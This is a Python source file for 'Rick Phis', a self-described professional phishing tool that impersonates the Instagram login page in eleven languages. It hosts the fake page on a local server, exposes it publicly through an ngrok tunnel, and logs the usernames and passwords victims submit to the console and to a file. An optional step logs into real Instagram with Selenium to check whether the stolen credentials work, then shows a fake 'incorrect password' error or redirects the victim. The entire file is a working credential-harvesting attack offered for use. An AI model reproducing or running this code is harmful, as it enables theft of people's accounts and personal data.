import platform
import os
from http.server import BaseHTTPRequestHandler, HTTPServer
from colorama import Fore, init
import argparse
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from urllib.parse import unquote
import socket
import time
from datetime import datetime
from webdriver_manager.firefox import GeckoDriverManager
from pyngrok import ngrok
import json
import random


init()

red_color = Fore.RED
white_color = Fore.WHITE
yellow_color = Fore.YELLOW
green_color = Fore.GREEN

current_datetime = datetime.now()
formatted_date = current_datetime.strftime("%d/%m/%Y %H:%M:%S")

logo = """  _____  _      _      _____  _     _      
 |  __ \\(_)    | |    |  __ \\| |   (_)     
 | |__) |_  ___| | __ | |__) | |__  _ ___  
 |  _  /| |/ __| |/ / |  ___/| '_ \\| / __| 
 | | \\ \\| | (__|   <  | |    | | | | \\__ \\ 
 |_|  \\_\\_|\\___|_|\\_\\ |_|    |_| |_|___/"""

accounts = [
    "[1] Normal",  "[2] Security",
    "[3] Verify",  "[4] CLD Tools"
]

print(f"{red_color}{logo}")
print(Fore.WHITE + "\n                     by https://github.com/Rickidevs\n")

for account in accounts:
    number, description = account.split(']', 1)
    print(f'{red_color}[{white_color}{number[1]}{red_color}] {yellow_color}{description.strip()}')

print(Fore.RESET)

filehir = open("hir.txt", "r")
sentences = filehir.read().splitlines()
filehir.close()
random_sent = random.choice(sentences)
print(f"{yellow_color}[{green_color}HINT{yellow_color}]{white_color} {random_sent}\n")

path_separator = '\\' if platform.system() == 'Windows' else '/'

language_mapping = {
    'ar': f"htmls{path_separator}ar.html",
    'az': f"htmls{path_separator}az.html",
    'ch': f"htmls{path_separator}ch.html",
    'en': f"htmls{path_separator}index.html",
    'fr': f"htmls{path_separator}fr.html",
    'de': f"htmls{path_separator}de.html",
    'it': f"htmls{path_separator}it.html",
    'ko': f"htmls{path_separator}ko.html",
    'ru': f"htmls{path_separator}ru.html",
    'es': f"htmls{path_separator}es.html",
    'tr': f"htmls{path_separator}tr.html"
}


help_menu = f"""{Fore.WHITE}
RICK PHIS - PROFESSIONAL PHISHING TOOL

        Arguments        shortcut     Required           Description 
                                                                                                                                                       
  --site  <site_number>     -s        {Fore.RED}YES{Fore.WHITE}         Site number (e.g., 1, 2, 3)
  --ngrok-token <token>     -ng       {Fore.RED}YES{Fore.WHITE}         Ngrok authentication token for tunneling
  --lang  <language_code>   -l        NO          Language code (ar,az,ch,en,fr,de,it,ko,ru,es,tr) (default: en)                                                
  --port  <port_number>     -p        NO          Port number (0-65535)                                                                                         
  --output <file_name>      -o        NO          Gets information as output                                                                                    
  --location <url>          --loc     NO          Redirect location (default: https://instagram.com)                                                            
  --check                   -c        NO          It tests the entered information and shows whether it is correct.  
  --headless                --hoff    NO          Run Selenium in headless mode
  --help                    -h        NO          Show this help message and exit                                                                               
"""

login_check = True

def check_trust(username, password, headless=True):
    global login_check
    options = webdriver.ChromeOptions()
    if headless:
        options.add_argument('--headless')
    driver = webdriver.Firefox(executable_path=GeckoDriverManager().install())
    
    try:
        driver.get("https://www.instagram.com/accounts/login/")

        user_field = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.NAME, "username")))
        pass_field = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.NAME, "password")))

        user_field.send_keys(username)
        pass_field.send_keys(password)

        login_button = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button._acan._acap._acas._aj1-._ap30")))
        login_button.click()

        error_message = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, "//div[@class='_ab2z']")))

        if error_message:
            login_check = False
            print(Fore.RED + "Login failed! The username or password is incorrect." + Fore.RESET)
        else:
            print(Fore.GREEN + "Login successful!" + Fore.RESET)
            login_check = True

    except Exception as e:
        print(f"An error occurred: {str(e)}")
    finally:
        driver.quit()

def find_empty_port(start_port=8000, end_port=65535):
    for port in range(start_port, end_port + 1):
        if not is_port_in_use(port):
            return port
    print("No free ports were found in the specified range.")
    return None

def is_port_in_use(port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('localhost', port))
        s.close()
        return False
    except OSError:
        return True


class CustomArgumentParser(argparse.ArgumentParser):
    def error(self, message):
        raise argparse.ArgumentError(None, message)

def main():
    global web_site, ngrok_url
    parser = CustomArgumentParser(description="Rick Phis - professional phishing tool", usage=argparse.SUPPRESS, add_help=False)
    parser.add_argument('--site','-s', type=int, required=True, help='Site number (e.g., 1, 2, 3)')
    parser.add_argument('--lang','-l', type=str, default='en', help='Language code (e.g., en, tr, de)')
    parser.add_argument('--port','-p', type=int, default=0, help='Port number (0-65535)')
    parser.add_argument('--output','-o', type=str, help='Gets information as output')
    parser.add_argument('--location','--loc', type=str, default='https://instagram.com', help='Redirect location (default: https://instagram.com)')
    parser.add_argument('--check', '-c', action='store_true', help='Perform login check')
    parser.add_argument('--ngrok-token','-ng', type=str, required=True, help='Ngrok authentication token for tunneling')
    parser.add_argument('--headless','--heoff', action='store_true', help='Run Selenium in headless mode')


    try:
        while True:
            user_input = input(Fore.BLUE + "Phish:" + Fore.RESET).strip().split()
            if 'help' in user_input or '-h' in user_input or '--help' in user_input:
                print(help_menu)
                continue
            try:
                args = parser.parse_args(user_input)
            except argparse.ArgumentError as e:
                print(Fore.RED + "Invalid arguments, please get help with --help/-h command!" + Fore.RESET)
                print(Fore.RESET)
                continue
            except SystemExit:
                print(Fore.RED + "Invalid arguments, please get help with --help/-h command!" + Fore.RESET)
                print(Fore.RESET)
                continue

            if args.port < 0 or args.port > 65535:
                print(Fore.RED + "Port number must be in the range 0-65535!")
                continue

            chosen = args.site
            lang = args.lang
            port = args.port
            output_file = args.output
            redirect_location = args.location
            check_login = args.check
            ngrok_token = args.ngrok_token
            headless_mode = args.headless

            web_site = language_mapping.get(lang.lower())
            language_code = web_site.split(path_separator)[1]
            if language_code.startswith("ar"):
                error_message = "عذرًا، كلمة المرور غير صحيحة. يرجى التحقق مرة أخرى."
            elif language_code.startswith("az"):
                error_message = "Təsüfki, şifrə yanlışdır. Zəhmət olmasa parolunuzu yenidən yoxlayın."
            elif language_code.startswith("ch"):
                error_message = "抱歉，您的密码不正确。请再次检查您的密码。"
            elif language_code.startswith("de"):
                error_message = "Entschuldigung, Ihr Passwort war falsch. Bitte überprüfen Sie Ihr Passwort."
            elif language_code.startswith("es"):
                error_message = "Lo siento, su contraseña no es correcta. Por favor, verifique su contraseña."
            elif language_code.startswith("fr"):
                error_message = "Désolé, votre mot de passe est incorrect. Veuillez vérifier votre mot de passe."
            elif language_code.startswith("index"):
                error_message = "Sorry, your password was incorrect. Please double-check your password."
            elif language_code.startswith("it"):
                error_message = "Spiacenti, la password inserita non è corretta. Si prega di controllare nuovamente la password."
            elif language_code.startswith("ko"):
                error_message = "죄송합니다. 비밀번호가 잘못되었습니다. 비밀번호를 다시 확인해주세요."
            elif language_code.startswith("ru"):
                error_message = "Извините, ваш пароль неверен. Пожалуйста, проверьте свой пароль."
            elif language_code.startswith("tr"):
                error_message = "Üzgünüz, şifreniz yanlış. Lütfen şifrenizi kontrol edin."
            else:
                error_message = "Sorry, your password was incorrect. Please double-check your password."

            if not web_site:
                print(Fore.RED + "Invalid language code!")
                continue
            if chosen == 1:
                start_server(web_site, port, output_file, redirect_location, check_login, ngrok_token, headless_mode,error_message)
            else:
                print(f"Site {chosen} is under development. Coming soon!")

    except KeyboardInterrupt:
        print(Fore.YELLOW, "\nRick Phis was stopped (ctrl+c)", Fore.RESET)

def start_server(web_site, port, output_file, redirect_location, check_login, ngrok_token, headless_mode,error_message):
    class MyHTTPRequestHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            file_path = self.path.strip('/')
            if file_path == '':
                file_path = web_site
            
            try:
                if file_path.endswith('.css'):
                    with open(file_path, 'rb') as file:
                        content = file.read()
                        self.send_response(200)
                        self.send_header('Content-type', 'text/css')
                        self.end_headers()
                        self.wfile.write(content)
                else:
                    with open(file_path, 'rb') as file:
                        content = file.read()
                        self.send_response(200)
                        self.send_header('Content-type', 'text/html')
                        self.end_headers()
                        self.wfile.write(content)
            except FileNotFoundError:
                self.send_error(404, f'File Not Found: {self.path}')
            except Exception as e:
                self.send_error(500, f'Server Error: {e}')
        
        def do_POST(self):
            global login_check
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode('utf-8')
                post_data = post_data.split('&')
                data_dict = {}
                for item in post_data:
                    key, value = item.split('=')
                    data_dict[key] = value
                
                sel_username = unquote(data_dict.get('username', ''))
                sel_password = unquote(data_dict.get('password', ''))
                
                print(f"{Fore.BLUE}[{formatted_date}] {Fore.RED}Username: {sel_username}")
                print(f"{Fore.BLUE}[{formatted_date}] {Fore.RED}Password: {sel_password}{Fore.RESET}")
                
                log_message = ""
                if output_file:
                    log_message = f"[{formatted_date}] Username: {sel_username}\n" \
                                f"[{formatted_date}] Password: {sel_password}\n"
                    with open(output_file, 'a') as file:
                        file.write(log_message)
                
                if check_login:
                    check_trust(sel_username, sel_password, headless_mode)
                
                response = {}
                if login_check == True or not check_trust:
                    response['status'] = 'success'
                    response['redirect'] = redirect_location
                else:
                    response['status'] = 'error'
                    response['error_msg'] = error_message
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(response).encode())

            except Exception as e:
                self.send_error(500, f'Failed to process POST request: {e}')

    host = "localhost"
    if port:
        if is_port_in_use(port):
            print(Fore.RED, f"The specified port {port} is already in use.")
            return
        c_port = port
    else:
        c_port = find_empty_port()

    if c_port:
        try:
            server = HTTPServer((host, c_port), MyHTTPRequestHandler)
            
            ngrok.set_auth_token(ngrok_token)
            ngrok_tunnel = ngrok.connect(c_port)
            ngrok_url = ngrok_tunnel.public_url
            print(f"{Fore.GREEN}\nNgrok URL: {ngrok_url}\n", Fore.RESET)
            print(f"{Fore.GREEN}Local Server URL: http://{host}:{c_port}/\n", Fore.RESET)
            
            server.serve_forever()
        except Exception as e:
            print(Fore.RED, f"Failed to start server: {e}")
    else:
        print(Fore.RED, "No free port found")

if __name__ == "__main__":
    main()
